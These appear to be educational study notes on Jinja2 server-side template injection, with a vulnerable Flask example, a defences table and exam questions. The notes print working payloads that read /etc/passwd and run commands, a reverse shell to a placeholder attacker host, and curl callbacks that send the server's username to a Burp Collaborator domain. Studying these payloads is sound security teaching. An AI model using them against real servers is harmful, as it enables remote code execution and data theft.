# Theory

SSTI (Server-Side Template Injection) is a vulnerability where an attacker injects malicious template directives into a server-side template engine. If user input is embedded directly into a template string and then rendered, the template engine evaluates the attacker's expression — potentially allowing arbitrary code execution on the server.

## Key Aspects

	User input is evaluated as template syntax, not treated as data
	The server-side template engine processes the injected expression
	Types: Basic (In-band) SSTI & Blind SSTI

# Scenarios
## Basic (In-band) SSTI

A web application renders a personalised greeting using a Jinja2 template (Python/Flask):

URL:
`https://shop.test/greet?name=Alice`

Response:
`Hello, Alice!`

The server directly embeds the `name` parameter into a Jinja2 template string and renders it.

### a. Predict the Backend Behaviour

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get('name')
    template = f"Hello, {name}!"          # user input embedded directly
    return render_template_string(template)
```

The `name` value is concatenated into the template string before rendering — any Jinja2 expression inside `name` will be executed by the engine.

### b. Modify the request to test for Basic SSTI

Inject a simple arithmetic expression using Jinja2 syntax:

```
https://shop.test/greet?name={{7*7}}
```

- If the response shows `Hello, 49!` instead of `Hello, {{7*7}}!`, the server is **evaluating the expression** → **vulnerable to SSTI**.
- If the response echoes `Hello, {{7*7}}!` literally, the input is treated as plain text → not vulnerable.

Test with a string operation to confirm the engine:

```
https://shop.test/greet?name={{"abc"|upper}}
```

- Jinja2 response: `Hello, ABC!` → confirms Jinja2.

### c. Conditions required for Basic SSTI

1. User input must be **embedded directly into a template string** (string interpolation/concatenation) before rendering.
2. The application must use a **server-side template engine** (Jinja2, Twig, FreeMarker, Velocity, etc.).
3. The template engine must **evaluate the full rendered string**, including user-supplied portions.
4. The server's response must **reflect the result** of the evaluated expression back to the attacker.

> SSTI is not the same as XSS. The injection is processed by the server's template engine, not the client's browser — making it far more dangerous (can lead to RCE).

### d. Craft a payload to read a server-side file

Using Jinja2's access to Python built-ins via the `__class__` chain:

```
https://shop.test/greet?name={{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
```

- `config` is a Jinja2 global object available in Flask contexts.
- `.__class__.__init__.__globals__['os']` accesses the Python `os` module.
- `.popen('cat /etc/passwd').read()` executes a shell command and returns its output.
- The output of `/etc/passwd` is **embedded directly in the response**.

Simpler payload for environments where `os` is accessible:

```
https://shop.test/greet?name={{''.__class__.__mro__[1].__subclasses__()[407]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].decode()}}
```

### e. Craft a payload to achieve Remote Code Execution (RCE)

```
https://shop.test/greet?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

- Executes the `id` command on the server — returns the user/group the web process runs as.
- Confirms full **Remote Code Execution**.

To establish a reverse shell (replace `<attacker-ip>` and `<port>`):

```
https://shop.test/greet?name={{config.__class__.__init__.__globals__['os'].popen('bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1').read()}}
```

---

## Blind SSTI

The same greeting endpoint exists, but the application **does not reflect the rendered output** to the user. It only returns:
- `"Message sent!"` — after processing
- `"Error"` — if something goes wrong

URL:
`https://shop.test/notify?message=Hello+Alice`

### a. Predict the Backend Behaviour

The server renders the `message` parameter into a template but only stores it internally (e.g., logs it or sends it as an internal email) — the rendered result is never returned to the attacker.

```python
template = f"Notification: {message}"
render_template_string(template)          # rendered but not returned
return "Message sent!"
```

### b. Modify the request to test for Blind SSTI

Since no output is reflected, use a **time-delay payload** to confirm evaluation:

Jinja2 (Python):
```
https://shop.test/notify?message={{''.__class__.__mro__[1].__subclasses__()[407]('sleep 5',shell=True,stdout=-1).communicate()}}
```

- If the response is delayed by ~5 seconds, the template engine executed the shell command → **vulnerable to Blind SSTI**.
- If the response is immediate, the payload was not evaluated.

Alternatively, use an **out-of-band DNS callback**:

```
https://shop.test/notify?message={{config.__class__.__init__.__globals__['os'].popen('curl http://<collaborator-id>.burpcollaborator.net').read()}}
```

- If the Burp Collaborator logs an incoming HTTP request from `shop.test`, execution is confirmed.

### c. Conditions required for Blind SSTI

1. User input is **embedded into a template string** and rendered server-side.
2. The **rendered output is not returned** to the attacker (only a static success/error message is shown).
3. The server must have **command execution capabilities** accessible from the template engine.
4. The attacker must use **time-based or out-of-band techniques** to confirm exploitation.

> Blind SSTI is as dangerous as in-band SSTI — the lack of reflected output only makes detection harder, not exploitation. Full RCE is still achievable via out-of-band channels.

### d. Craft a payload to exfiltrate data via DNS

```
https://shop.test/notify?message={{config.__class__.__init__.__globals__['os'].popen('curl http://$(whoami).<collaborator>.burpcollaborator.net').read()}}
```

- The `$(whoami)` is evaluated by the shell → the result is embedded as a subdomain in the DNS query.
- The Burp Collaborator dashboard shows an incoming DNS request like `www.<collaborator>.burpcollaborator.net` — revealing the server's current user.

### e. State the defences against SSTI and explain how they break the attack

| Defence | How it works | How it breaks SSTI |
|---|---|---|
| **Never embed user input in template strings** | Pass user data as template variables, not as part of the template itself | Template engine receives `name` as data — `{{name}}` is rendered as a literal string, not evaluated |
| **Input validation / allowlist** | Reject input containing template syntax characters (`{{`, `}}`, `{%`, etc.) | Attacker's payload is rejected before it reaches the template engine |
| **Sandboxed template rendering** | Use template engines in sandbox mode (e.g., Jinja2 `SandboxedEnvironment`) | Restricts access to Python internals, `os` module, and `__class__` chains |
| **Least-privilege process** | Run the web server as a low-privilege user | Even if RCE is achieved, the attacker cannot read sensitive files or write to system directories |
| **WAF rules** | Block requests containing common SSTI payloads (`__class__`, `__globals__`, `popen`) | Malicious payloads are blocked at the perimeter |

---

# Exam-Style Questions

## Question 1 — InternConnect Portal

An internship portal **InternConnect** generates personalised application status pages. The URL accepts a candidate's name and renders it inside a Jinja2 template:

`https://internconnect.test/status?name=John`

Response:
`Application status for John: Under Review`

### (a) Identify the vulnerability and test for it

The `name` parameter is embedded directly into a Jinja2 template string before rendering.

**Test payload:**
```
https://internconnect.test/status?name={{7*7}}
```

- Expected vulnerable response: `Application status for 49: Under Review`
- If `49` appears instead of `{{7*7}}`, the server is **vulnerable to SSTI**.

### (b) Craft a payload to read `/etc/passwd`

```
https://internconnect.test/status?name={{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
```

- The contents of `/etc/passwd` are embedded in the response where `name` would normally appear.

### (c) Explain why this is more severe than XSS

| Aspect | XSS | SSTI |
|---|---|---|
| Execution context | Victim's browser (client-side) | Server (server-side) |
| Impact | Session theft, UI manipulation | Remote Code Execution, file read, server takeover |
| Affected party | Individual users who visit the page | The entire server and all its data |
| Persistence | Limited to browser session | Persistent until server is patched |
